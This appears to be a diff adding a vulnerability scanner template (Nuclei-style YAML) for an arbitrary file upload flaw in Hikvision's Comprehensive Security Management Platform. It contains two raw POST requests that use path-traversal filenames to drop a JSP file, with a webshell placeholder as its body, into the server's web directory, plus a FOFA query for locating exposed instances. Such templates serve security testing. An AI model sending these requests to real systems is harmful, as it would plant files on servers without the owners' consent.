@@ -1,0 +1,50 @@
+id: hikvision-arbitrary-file-upload
+
+info:
+  name: Hikvision Comprehensive Security Management Platform Arbitrary File Upload
+  author: ProjectDiscoveryAI,dostghost
+  severity: high
+  description: |
+    This template checks for arbitrary file upload vulnerability in Hikvision Comprehensive Security Management Platform.
+  reference:
+    - https://github.com/AboSteam/POPC/blob/main/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="HIKVISION-iSecure-Center"
+  tags: hikvision, file-upload, security, intrusive
+
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+        Content-Type: application/zip
+
+        <%jsp的马%>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+      - |
+        POST /center/api/files;.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+        Content-Type: application/zip
+
+        <%jsp的马%>
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/portal/ui/login/..;/..;/new.jsp"
